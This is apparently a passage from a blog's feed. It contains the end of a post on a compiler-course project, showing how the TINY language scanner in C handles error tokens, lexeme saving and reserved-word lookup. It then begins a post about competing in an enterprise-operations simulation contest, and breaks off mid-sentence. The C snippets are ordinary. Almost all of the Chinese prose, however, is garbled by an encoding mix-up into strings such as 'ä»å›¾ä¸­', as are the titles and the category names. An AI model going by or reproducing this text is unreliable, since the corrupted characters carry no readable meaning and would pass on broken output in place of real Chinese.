title="ERROR"></a>ERROR</h2><p>ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ²¡æœ‰å°†è¯æ³•é”™è¯¯<code>ERROR</code>å•ç‹¬ä½œä¸ºä¸€ä¸ªçŠ¶æ€æ¥å‚ä¸çŠ¶æ€è½¬ç§»ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å‘ç”Ÿ<code>ERROR</code>çš„ä¸¤ç§æƒ…å†µï¼š</p><ol><li>è¯»å…¥çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯<code>{</code>ã€æ•°å­—ã€å­—æ¯ã€<code>:</code>ä»¥åŠTINYå…è®¸çš„è¿ç®—ç¬¦ï¼Œåˆ™å½“å‰å­—ç¬¦å‘ç”Ÿ<code>ERROR</code>ã€‚</li><li>è¯»å…¥çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯<code>:</code>ï¼Œä½†æ˜¯ç¬¬äºŒä¸ªå­—ç¬¦ä¸æ˜¯<code>=</code>ï¼Œåˆ™ä¸Šä¸€ä¸ªå­—ç¬¦(<code>:</code>)å‘ç”Ÿ<code>ERROR</code>ã€‚</li></ol><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><p>1. </p>   <figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">  <span class="keyword">switch</span> (c)</span><br><span class="line">  {</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">default</span>:</span><br><span class="line">         state = DONE;</span><br><span class="line">         currentToken = ERROR;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">   }</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><p>   <code>save</code>æ­¤æ—¶ä¸ºé»˜è®¤å€¼<code>true</code>ï¼Œå°†å½“å‰è¯»å…¥çš„ï¼ˆé”™è¯¯ï¼‰å­—ç¬¦ä¿å­˜ä»¥å¤‡è¾“å‡º</p><p>2. </p>   <figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> INASSIGN:</span><br><span class="line">  state = DONE;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">'='</span>)</span><br><span class="line">    currentToken = ASSIGN;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  { <span class="comment">/* backup in the input */</span></span><br><span class="line">    ungetNextChar();</span><br><span class="line">    save = FALSE;</span><br><span class="line">    currentToken = ERROR;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>   è‹¥è¿›å…¥<code>INASSIGN</code>åï¼ˆå³è¯»å…¥<code>:</code>åï¼‰ï¼Œè¯»å…¥çš„å­—ç¬¦ä¸æ˜¯<code>=</code>ï¼Œå‘ç”Ÿäº†é”™è¯¯ã€‚<br>   è°ƒç”¨<code>ungetNextChar()</code>å›é€€ä¸€ä¸ªå­—ç¬¦ï¼Œä»¤è¯¥å­—ç¬¦å‚ä¸ä¸‹ä¸€è½®çš„æ‰«æã€‚<br>   <code>save</code>ç½®ä¸º<code>false</code>ï¼Œå› ä¸ºå‘ç”Ÿé”™è¯¯çš„æ˜¯å‰ä¸€ä¸ªå­—ç¬¦<code>:</code>ï¼Œè€Œä¸æ˜¯å½“å‰è¯»å…¥çš„å­—ç¬¦ã€‚</p><h2 id="Lexeme"><a href="#Lexeme" class="headerlink" title="Lexeme"></a>Lexeme</h2><p>ä»ç¤ºä¾‹å›¾çš„é¢„æœŸè¾“å‡ºä»¥åŠ<code>util.c</code>ä¸­çš„<code>printToken()</code>å‡½æ•°å¯çŸ¥ï¼š</p><p>å½“è¯æ³•å•å…ƒç±»å‹ä¸º<code>Reserved Words</code>, <code>ID</code>, <code>NUM</code>æˆ–<code>ERROR</code>æ—¶ï¼Œéœ€è¦è¾“å‡ºå…¶å¯¹åº”çš„è¯ç´ ã€‚å› æ­¤åœ¨ç¼–å†™ç¨‹åºæ—¶ï¼Œå½“é‡åˆ°è¿™å‡ ç§è¯æ³•å•å…ƒï¼Œéœ€è¦å°†è¯»å…¥çš„å­—ç¬¦é€ä¸ªä¿å­˜ï¼Œä»¥ä¾¿åœ¨åˆ°è¾¾<code>DONE</code>çŠ¶æ€æ—¶è¾“å‡ºã€‚</p><h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* lexeme of identifier or reserved word */</span></span><br><span class="line"><span class="type">char</span> tokenString[MAXTOKENLEN + <span class="number">1</span>];</span><br></pre></td></tr></tbody></table></figure><p>å®šä¹‰äº†ä¸€ä¸ªåä¸º<code>tokenString</code>çš„å­—ç¬¦æ•°ç»„ï¼Œç”¨æ¥ä¿å­˜ä¸Šè¿°æƒ…å†µä¸‹çš„è¯ç´ ã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> tokenStringIndex = <span class="number">0</span>;</span><br></pre></td></tr></tbody></table></figure><p>æ¯ä¸€è½®æ‰«æä¼šå°†å­—ç¬¦æ•°ç»„çš„ç´¢å¼•ç½®é›¶ï¼Œä»¥ä¾¿ä¿å­˜æ–°çš„è¯ç´ ã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (state == DONE)</span><br><span class="line">{</span><br><span class="line">  tokenString[tokenStringIndex] = <span class="string">'\0'</span>;</span><br><span class="line">  <span class="keyword">if</span> (currentToken == ID)</span><br><span class="line">    currentToken = reservedLookup(tokenString);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>æ¯ä¸€è½®æ‰«æç»“æŸåœ¨å­—ç¬¦æ•°ç»„ç»“å°¾åŠ ä¸Šç»ˆæ­¢ç¬¦<code>\0</code>ï¼Œå› ä¸ºæœ¬è½®ä¿å­˜çš„å­—ç¬¦ä¸²é•¿åº¦å¯èƒ½å°äºä¸Šä¸€è½®ä¿å­˜çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œè¿™æ ·åšå¯ä»¥é¿å…ä¸Šä¸€è½®ä¿å­˜çš„å­—ç¬¦ä¸²å½±å“è¿™ä¸€è½®çš„è¾“å‡ºã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* flag to indicate save to tokenString */</span></span><br><span class="line"><span class="type">int</span> save;</span><br></pre></td></tr></tbody></table></figure><p>å®šä¹‰äº†ä¸€ä¸ªæ•´å‹å˜é‡<code>save</code>ï¼ˆå®é™…å½“ä½œå¸ƒå°”å‹ç”¨ï¼‰ï¼Œç”¨æ¥æŒ‡ç¤ºå½“å‰è¯»å…¥çš„å­—ç¬¦æ˜¯å¦éœ€è¦ä¿å­˜åˆ°<code>tokenString</code>ã€‚<br>åœ¨æ¯ä¸€è½®å¾ªç¯çš„å¼€å§‹ï¼Œå³æ¯è¯»å…¥ä¸€ä¸ªæ–°çš„å­—ç¬¦åï¼Œ<code>save</code>éƒ½è¢«ç½®ä¸º<code>true</code>ï¼Œé»˜è®¤è¦ä¿å­˜è¯¥å­—ç¬¦ã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((save) &amp;&amp; (tokenStringIndex &lt;= MAXTOKENLEN))</span><br><span class="line">  tokenString[tokenStringIndex++] = (<span class="type">char</span>)c;</span><br></pre></td></tr></tbody></table></figure><p>æ¯ä¸€è½®å¾ªç¯çš„å°¾éƒ¨ï¼Œå¦‚æœ<code>save</code>ä¸º<code>true</code>ï¼Œå°†å½“å‰è¯»å…¥çš„å­—ç¬¦ä¿å­˜åˆ°<code>tokenString</code>å°¾éƒ¨ã€‚</p><p>å®é™…ä¸Šï¼Œåªæœ‰è¿›å…¥<code>INID</code>ã€<code>INNUM</code>ã€<code>INASSIGN</code>æˆ–è¯»å…¥çš„å­—ç¬¦éé¢„æœŸæ—¶ï¼Œæ‰éœ€è¦ä¿å­˜è¯»å…¥çš„ä¸€ä¸²å­—ç¬¦ã€‚ä¸‹é¢æˆ‘ä»¬é€ä¸ªæƒ…å†µè®¨è®ºï¼š</p><ol><li><p>è¿›å…¥<code>INID</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isalpha</span>(c))</span><br><span class="line">  state = INID;</span><br></pre></td></tr></tbody></table></figure><p>ä»<code>START</code>è½¬ç§»åˆ°<code>INID</code>æ—¶ï¼Œä»…ä»…è½¬ç§»çŠ¶æ€ï¼Œ<code>save</code>ä»ä¸ºé»˜è®¤å€¼<code>true</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> INID:</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isalpha</span>(c))</span><br><span class="line">  { <span class="comment">/* backup in the input */</span></span><br><span class="line">    ungetNextChar();</span><br><span class="line">    save = FALSE;</span><br><span class="line">    state = DONE;</span><br><span class="line">    currentToken = ID;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></tbody></table></figure><p>è¿›å…¥<code>INID</code>åï¼Œå½“ä¸”ä»…å½“è¯»å…¥éå­—æ¯æ—¶æ‰«æç»“æŸã€‚<br>æ­¤æ—¶è°ƒç”¨<code>ungetNextChar()</code>å‡½æ•°å›é€€ä¸€ä¸ªå­—ç¬¦ï¼Œä»¤è¯¥å­—ç¬¦å‚ä¸ä¸‹ä¸€è½®çš„æ‰«æã€‚<br><code>save</code>ç½®ä¸º<code>false</code>è¡¨ç¤ºå½“å‰è¯»å…¥çš„å­—ç¬¦ä¸æ˜¯è¯¥è½®æ‰«ææ‰€å¾—è¯ç´ çš„ä¸€éƒ¨åˆ†ã€‚</p></li><li><p>è¿›å…¥<code>INNUM</code></p><p>å®ç°æ–¹æ³•ä¸æƒ…å†µ1ä¸€è‡´</p></li><li><p>åœ¨å‰æ–‡è®¨è®º<code>ERROR</code>æ—¶å·²ç»™å‡º</p></li><li><p>åœ¨å‰æ–‡è®¨è®º<code>ERROR</code>æ—¶å·²ç»™å‡º</p></li></ol><h2 id="Reserved-Words"><a href="#Reserved-Words" class="headerlink" title="Reserved Words"></a>Reserved Words</h2><p><code>Reserved Words</code>å’Œ<code>ID</code>çš„åŒºåˆ«åœ¨äºï¼šå‰è€…ç”±TINYè¯­è¨€é¢„å®šä¹‰ï¼Œåè€…ç”±ç¨‹åºå‘˜è‡ªå®šä¹‰ã€‚å› æ­¤ï¼Œä¸ä¸¥è°¨åœ°è¯´ï¼Œ<code>Reserved Words</code>ä¹Ÿæ˜¯ä¸€ç§<code>ID</code>ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè‡ªç„¶åœ°å°†<code>Reserved Words</code>ä¸<code>ID</code>çš„æ‰«æåˆå¹¶ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œå½“è¯»å…¥ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºå­—æ¯çš„æ—¶å€™ï¼Œè¿›å…¥<code>INID</code>çŠ¶æ€ã€‚åœ¨é‡åˆ°éå­—æ¯å­—ç¬¦æ—¶æ‰èƒ½è½¬ç§»åˆ°<code>DONE</code>çŠ¶æ€ï¼Œåœ¨è¿™ä¹‹å‰æˆ‘ä»¬éƒ½æ— æ³•ç¡®è®¤è¯»å…¥çš„å­—ç¬¦ä¸²ï¼ˆå³è¯ç´ ï¼‰æ˜¯å¦æ˜¯<code>Reserved Words</code>ã€‚å› æ­¤åœ¨<code>INID</code>çŠ¶æ€æœŸé—´æˆ‘ä»¬å°†äºŒè€…ä¸€è§†åŒä»ï¼Œè€Œåœ¨è½¬ç§»åˆ°<code>DONE</code>çŠ¶æ€åå¯¹äºŒè€…è¿›è¡ŒåŒºåˆ†ã€‚æ¢å¥è¯è¯´ï¼Œåˆ¤æ–­è¯»å…¥çš„è¯ç´ æ˜¯å¦æ˜¯<code>Reserved Words</code>ã€‚</p><p>å‰æ–‡è¯´åˆ°ï¼Œå½“è¯æ³•å•å…ƒç±»å‹ä¸º<code>Reserved Words</code>æˆ–<code>ID</code>ï¼ˆäº¦å³è¿›å…¥<code>INID</code>çŠ¶æ€ï¼‰æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å°†è¯»å…¥çš„è¯ç´ ä¿å­˜ã€‚æˆ‘ä»¬åœ¨ä¸€ä¸ªåŒ…å«æ‰€æœ‰<code>Reserved Words</code>é”®å€¼å¯¹çš„è¡¨è¿›è¡ŒæŸ¥æ‰¾åŒ¹é…ï¼Œè‹¥ä¿å­˜çš„è¯ç´ ä¸è¡¨ä¸­çš„è¯ç´ ç›¸åŒï¼Œåˆ™è¿”å›ç›¸åº”çš„è¯æ³•å•å…ƒï¼Œå¦åˆ™è¡¨æ˜è¯¥è¯ç´ å¯¹åº”çš„è¯æ³•å•å…ƒä¸º<code>ID</code>ã€‚</p><h3 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* lookup table of reserved words */</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">char</span> *str;</span><br><span class="line">  TokenType tok;</span><br><span class="line">} reservedWords[MAXRESERVED] = {{<span class="string">"if"</span>, IF}, {<span class="string">"then"</span>, THEN}, {<span class="string">"else"</span>, ELSE}, {<span class="string">"end"</span>, END}, {<span class="string">"repeat"</span>, REPEAT}, {<span class="string">"until"</span>, UNTIL}, {<span class="string">"read"</span>, READ}, {<span class="string">"write"</span>, WRITE}};</span><br></pre></td></tr></tbody></table></figure><p>å®šä¹‰äº†ä¸€ä¸ªå…³é”®å­—çš„å­—å…¸ã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (state == DONE)</span><br><span class="line">{</span><br><span class="line">  tokenString[tokenStringIndex] = <span class="string">'\0'</span>;</span><br><span class="line">  <span class="keyword">if</span> (currentToken == ID)</span><br><span class="line">    currentToken = reservedLookup(tokenString);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>å½“ä¸€è½®æ‰«æç»“æŸæ—¶ï¼Œå¦‚æœè¯»å…¥çš„è¯ç´ è¢«åˆ¤å®šä¸º<code>ID</code>ï¼ˆå³è¯¥è½®æ‰«æç»è¿‡äº†<code>INID</code>åˆ°<code>DONE</code>çš„çŠ¶æ€è½¬ç§»ï¼‰ï¼Œåˆ™åœ¨å…³é”®å­—å­—å…¸ä¸­æŸ¥æ‰¾è¯¥è½®ä¿å­˜çš„è¯ç´ ã€‚å¦‚æœæŸ¥æ‰¾åˆ°ï¼Œè¿”å›ç›¸åº”çš„è¯æ³•å•å…ƒç±»å‹ï¼›å¦‚æœæœªæ‰¾åˆ°ï¼Œè¿”å›<code>ID</code>ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;NIS2336ç¼–è¯‘åŸç†è¯¾ç¨‹çš„å¤§(?)ä½œä¸šã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="é¡¹ç›®" scheme="https://blog.beacox.space/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="ç¼–è¯‘åŸç†" scheme="https://blog.beacox.space/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>EOVSâ€”â€”ä¼ä¸šè¿è¥ä»¿çœŸèµ›å‚èµ›è®°å½•</title>
    <link href="https://blog.beacox.space/posts/eovs/"/>
    <id>https://blog.beacox.space/posts/eovs/</id>
    <published>2023-01-11T09:47:50.000Z</published>
    <updated>2023-01-11T09:47:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>å»å¹´12æœˆä¸­æ—¬éšé˜Ÿå‚åŠ äº†ç¬¬åäºŒå±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿå·¥ç¨‹å®è·µä¸åˆ›æ–°èƒ½åŠ›å¤§èµ›â€”â€”ä¼ä¸šè¿è¥ä»¿çœŸèµ›é¡¹ï¼Œè·å¾—äº†ç‰¹ç­‰å¥–ï¼Œä¹Ÿæ˜¯æˆ‘åœ¨ä¹å–„å¯é™ˆçš„å¤§å­¦ç”Ÿæ´»ä¸­æ‹¿åˆ°çš„ç¬¬ä¸€ä¸ªå¸‚çº§å¥–é¡¹ã€‚å‰æ®µæ—¶é—´å¿™äºâ€œè¡¥å¤©â€ï¼ˆé¢„ä¹ æœŸæœ«ç§‘ç›®ï¼‰æ²¡æœ‰æ›´æ–°ï¼Œ2023çš„ç¬¬ä¸€ç¯‡æ–‡ç« å°±ä»è¿™é¡¹æ¯”èµ›ç€ç¬”å§ã€‚<span id="more"></span></p><h2 id="ä»€ä¹ˆæ˜¯EOVSï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯EOVSï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯EOVSï¼Ÿ"></a>ä»€ä¹ˆæ˜¯EOVSï¼Ÿ</h2><p>EOVSï¼Œåˆç§°ä¼ä¸šè¿è¥ä»¿çœŸèµ›ï¼Œæ˜¯å•†èµ›çš„ä¸€ç§ã€‚ç«èµ›å†…å®¹å¼•ç”¨<a href="http://sx.qyyyfz.com/introduction.jsp">åŸæ–‡</a>ï¼š</p><blockquote><p>å‚èµ›é˜Ÿå‘˜ç»„å»ºç»è¥å›¢é˜Ÿï¼Œæ¯ä¸ªå›¢é˜Ÿåˆ†è®¾æ€»ç»ç†ã€è´¢åŠ¡æ€»ç›‘ã€ç”Ÿäº§æ€»ç›‘ã€è¥é”€æ€»ç›‘4ä¸ªå²—ä½ï¼Œéœ€è¦åˆ›å»ºä¸€å®¶ç”Ÿäº§åˆ¶é€ å‹ä¼ä¸šï¼Œæ¨¡æ‹Ÿè¯¥ä¼ä¸šä¸¤å¹´å…«ä¸ªå­£åº¦çš„ç»è¥è¿‡ç¨‹ã€‚æ¶‰åŠå…¬å¸åˆ›å»ºã€ææ–™é‡‡è´­ã€ç”Ÿäº§è¿è¥ã€å¸‚åœºè¥é”€ã€è´¢åŠ¡ç®¡ç†ç­‰ç›¸å…³ä¼ä¸šç»è¥æ´»åŠ¨ã€‚åœ¨ä¼ä¸šè¿è¥è¿‡ç¨‹ä¸­ï¼Œç«èµ›å›¢é˜Ÿåº”å……åˆ†è€ƒè™‘ä¼ä¸šçš„å¤–éƒ¨ç¯å¢ƒå’Œä¼ä¸šå†…éƒ¨è¿è¥çŠ¶å†µï¼Œç»“åˆç«äº‰å¯¹æ‰‹æƒ…å†µï¼Œåˆ¶å®šç§‘å­¦åˆç†çš„ä¼ä¸šè¿è¥ç­–ç•¥ï¼Œç®¡ç†ä¼ä¸šè¿è¥é£é™©ï¼Œå®ç°ä¼ä¸šåˆ©æ¶¦æœ€å¤§åŒ–ã€‚</p></blockquote><p>è¯¥èµ›é¡¹çš„ç»„ç»‡æœºæ„æ˜¯åœ¨<code>æ•™è‚²éƒ¨å·¥ç¨‹è®­ç»ƒç«èµ›ç»„å§”ä¼š</code>é¢†å¯¼ä¸‹æˆç«‹çš„<code>ä¼ä¸šè¿è¥ä»¿çœŸèµ›é¡¹ç»„å§”ä¼š</code>ã€‚ä¸éš¾çœ‹å‡ºï¼Œèµ›äº‹çš„å«é‡‘é‡è¿œæ¯”ä¸ä¸Šè‘—åçš„è´æ©æ¯ã€å¥¥çº¬æ¯ã€åä¸ºè´¢åŠ¡ç²¾è‹±æŒ‘æˆ˜èµ›ç­‰ï¼Œä½†åœ¨å…¨å›½èŒƒå›´å†…è¿˜æ˜¯æœ‰ä¸€å®šçƒ­åº¦çš„ã€‚å¦å¤–ï¼Œå¼•ç”¨<a href="http://www.gcxl.edu.cn/new/index.html">ä¸­å›½å¤§å­¦ç”Ÿå·¥ç¨‹å®è·µä¸åˆ›æ–°èƒ½åŠ›å¤§èµ›å®˜ç½‘</a>ï¼š</p><blockquote><p>ä¸­å›½å¤§å­¦ç”Ÿå·¥ç¨‹å®è·µä¸åˆ›æ–°èƒ½åŠ›å¤§èµ›æ˜¯åˆ—å…¥ã€Šæ•™è‚²éƒ¨è¯„å®¡è¯„ä¼°å’Œç«èµ›æ¸…å•ï¼ˆ2021å¹´ç‰ˆï¼‰ã€‹ï¼ˆæ•™æ”¿æ³•å…å‡½(2021)2å·ï¼‰çš„é‡è¦èµ›äº‹ã€‚</p></blockquote><p>äº¦å³æ˜¯è¯´è¿™æ˜¯ä¸€é¡¹è¢«æ•™è‚²éƒ¨è®¤å¯çš„æ¯”èµ›ã€‚æŠ›å¼€åŠŸåˆ©å»è°ˆè¿™é¡¹æ¯”èµ›çš„è¯ï¼Œæˆ‘æ›´æ„¿æ„ç§°å…¶ä¸ºä¸€æ¬¾æ¸¸æˆï¼Œä¸€æ¬¾æ¨¡æ‹Ÿç»è¥ç±»æ¸¸æˆã€å€¾å‘äºåä½œçš„å›¢é˜Ÿæ¸¸æˆã€‚æ‰“å®Œä¸€å±€æ ‡å‡†ã€å®Œæ•´çš„æ¯”èµ›å¤§æ¦‚éœ€è¦4-5ä¸ªå°æ—¶ï¼Œæ¯ä¸€æ¬¡æ‰“è®­ç»ƒèµ›éƒ½åƒæ˜¯é…£ç•…æ·‹æ¼“åœ°ç©äº†ä¸€åœºçƒ§è„‘çš„ç­–ç•¥æ¸¸æˆã€‚</p><h2 id="ä¸ºä»€ä¹ˆä¼šå‚åŠ EOVSï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆä¼šå‚åŠ EOVSï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆä¼šå‚åŠ EOVSï¼Ÿ"></a>ä¸ºä»€ä¹ˆä¼šå‚åŠ EOVSï¼Ÿ</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œæˆ‘æ˜¯æ‰“å·¥äººå·¥ç§‘ç”Ÿï¼Œå•†èµ›çš„åå¤´å¯¹æˆ‘æ¥è¯´æ²¡ä»€ä¹ˆå¸å¼•åŠ›ã€‚å¤§ä¸€ä¸Šå­¦æœŸæ—¶ï¼ˆ2021å¹´ç§‹ï¼‰è®¤è¯†äº†ä¸ªæœ‹å‹ï¼ŒæŒºç¤¾ç‰›çš„ï¼Œæ‹‰ç€æˆ‘å‚åŠ ä¼ä¸šè¿è¥ä»¿çœŸèµ›çš„æ ¡å†…èµ›ã€‚å½“æ—¶æŒºé—²çš„ï¼Œå†åŠ ä¸Šç¬¬ä¸€åçš„é˜Ÿä¼æœ‰1000å…ƒå¥–é‡‘ï¼ˆå¹³æ‘Šä¸‹æ¥æ¯ä¸ªäºº250â€¦â€¦ï¼Œå¥‡æ€ªçš„æ•°å­—ï¼Œä½†æ˜¯ç”¨æ¥å¥½å¥½åƒä¸€é¡¿ä¸é¦™å—ï¼‰ï¼Œå°±ä¸€èµ·æŠ¥åå‚åŠ äº†ã€‚</p><h2 id="å‚èµ›ç»å†"><a href="#å‚èµ›ç»å†" class="headerlink" title="å‚èµ›ç»å†"></a>å‚èµ›ç»å†</h2><h3 id="æ ¡å†…èµ›å¤ºé­"><a href="#æ ¡å†…èµ›å¤ºé­" class="headerlink" title="æ ¡å†…èµ›å¤ºé­"></a>æ ¡å†…èµ›å¤ºé­</h3><p>æ¥ç€è¯´æ ¡å†…èµ›ï¼Œå½“æ—¶æŠ¥åçš„é˜Ÿä¼æœ‰20å¤šæ”¯ï¼Œæ­£å¼æ¯”èµ›å‰ä¸¾åŠäº†ä¸¤æ¬¡å‹è°Šèµ›ï¼Œå…¶å®å¯¹äºå¾ˆå¤šé˜Ÿä¼æ¥è¯´å°±æ˜¯è®­ç»ƒèµ›äº†ï¼Œæ¯•ç«Ÿä¸€åŠä»¥ä¸Šçš„é˜Ÿä¼éƒ½æ˜¯ç¬¬ä¸€æ¬¡å‚åŠ è¿™é¡¹æ¯”èµ›ã€‚å‚èµ›é€‰æ‰‹å€’æ˜¯æ¥è‡ªå„ä¸ªå­¦é™¢ã€å„ä¸ªä¸“ä¸šï¼Œä¹Ÿæœ‰è¢«æˆ‘ä»¬è§†ä½œä¸€å·ç§å­çš„ã€ç”±ç»ç®¡å­¦é™¢å­¦é•¿å­¦å§ç»„æˆçš„é˜Ÿä¼ã€‚æˆ‘ä»¬ç”±äºæ—¶é—´åŸå› åªå‚åŠ äº†ä¸€æ¬¡è®­ç»ƒèµ›ã€‚åˆ°äº†æ­£å¼æ¯”èµ›çš„æ—¶å€™ï¼Œåˆ†æˆäº†ä¸¤ç»„æ¯”èµ›â€”â€”å¹¸è¿çš„æ˜¯ï¼Œä¸€å·ç§å­é˜Ÿä¼å’Œæˆ‘ä»¬åˆ†åœ¨äº†ä¸¤ç»„ã€‚è™½ç„¶è¯´æˆ‘ä»¬åªå‚åŠ äº†ä¸€æ¬¡è®­ç»ƒèµ›ï¼Œå®é™…ä¸Šæˆ‘ä»¬æŸ¥é˜…äº†è®¸å¤šèµ„æ–™ï¼Œåšè¶³äº†å‡†å¤‡ã€‚åˆ°äº†èµ›åœºä¸Šå‘ç°æœ‰äº›ç»„è¿è®¡ç®—ç”¨çš„Excelè¡¨æ ¼éƒ½æ²¡æœ‰ï¼ˆé‡è¦é“å…·ï¼Œåé¢ä¼šè®²ï¼‰ï¼Œå¯¼è‡´ä»–ä»¬é¢„æœŸçš„åˆ©æ¶¦å’Œå®é™…åå·®å¤ªå¤§ï¼Œæ—©æ—©åœ°å°±ç ´äº§å‡ºå±€äº†ã€‚æ¯”èµ›åˆ°ä¸€åŠçš„æ—¶å€™æˆ‘ä»¬çš„åŠ¨æ€æ’åè¿˜æ˜¯ç¬¬ä¸‰ï¼Œä½†ç”±äºå‰æœŸé«˜é¢çš„ç ”å‘æŠ•å…¥è®©æˆ‘ä»¬çš„äº§å“æœ‰æ˜æ˜¾çš„è´¨é‡ä¼˜åŠ¿ï¼Œåœ¨æœ€åä¸¤å­£åº¦æˆ‘ä»¬å‡­å€Ÿé«˜ä»·ã€é«˜é”€é‡æŒ£å¾—æ›´å¤šå‡€åˆ©æ¶¦ï¼Œæœ€ç»ˆæ’åç»„å†…ç¬¬ä¸€ã€‚ç”±äºåˆ†äº†ä¸¤ç»„ï¼Œæ‰€ä»¥ç¬¬ä¸€åªæœ‰500å…ƒå¥–é‡‘äº†ï¼ˆå“­ï¼‰ï¼Œèµ›åå°±åªèƒ½åœ¨é£Ÿå ‚åƒäº†åº†åŠŸå®´ã€‚</p><h3 id="çŸ¥ç¿°æ¯â€œç™¾å›¢å¤§æˆ˜â€æƒ¨é­æ»‘é“å¢"><a href="#çŸ¥ç¿°æ¯â€œç™¾å›¢å¤§æˆ˜â€æƒ¨é­æ»‘é“å¢" class="headerlink" title="çŸ¥ç¿°æ¯â€œç™¾å›¢å¤§æˆ˜â€æƒ¨é­æ»‘é“å¢"></a>çŸ¥ç¿°æ¯â€œç™¾å›¢å¤§æˆ˜â€æƒ¨é­æ»‘é“å¢</h3><p>æ ¡å†…èµ›æ‹¿åˆ°ç»„å†…ç¬¬ä¸€ä¹‹åï¼Œæˆ‘ä»¬çš„å¿ƒæ€äº§ç”Ÿäº†ä¸€äº›å˜åŒ–â€”â€”ä¸å†åªæ˜¯â€œé‡åœ¨å‚ä¸â€äº†ï¼Œè€Œæ˜¯äº‰å¾—æ›´é«˜çº§åˆ«çš„å¥–é¡¹ã€‚â€œç™¾å›¢å¤§æˆ˜â€æ˜¯2022å¹´æš‘å‡ä¸¾åŠçš„ä¸€æ¬¡å…¨å›½æ€§ä¼ä¸šè¿è¥ä»¿çœŸèµ›ï¼Œå…¶å®é‚£æ—¶è·ç¦»æˆ‘ä»¬å‚åŠ æ 